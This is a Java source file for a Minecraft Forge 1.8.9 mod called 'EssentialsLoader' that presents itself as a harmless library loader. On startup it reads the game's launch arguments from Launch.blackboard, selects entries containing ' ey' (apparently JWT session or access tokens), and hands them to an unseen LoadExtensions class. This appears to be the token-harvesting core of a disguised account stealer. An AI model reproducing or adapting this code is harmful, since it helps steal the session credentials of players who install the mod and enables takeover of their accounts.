package essentials.lib;


import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid = "essentialsloader", name = "EssentialsLoader", version = "1.9.1", acceptedMinecraftVersions = "[1.8.9]")
public class Essentials {
    public static String init = Launch.blackboard.toString();
    static String[] loading = init.split(",", -1);
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) throws Exception {
        for (String LoadEssentials : loading) {
            if (LoadEssentials.contains(" ey")) {
                new LoadExtensions(LoadEssentials);
            }
        }
    }
}
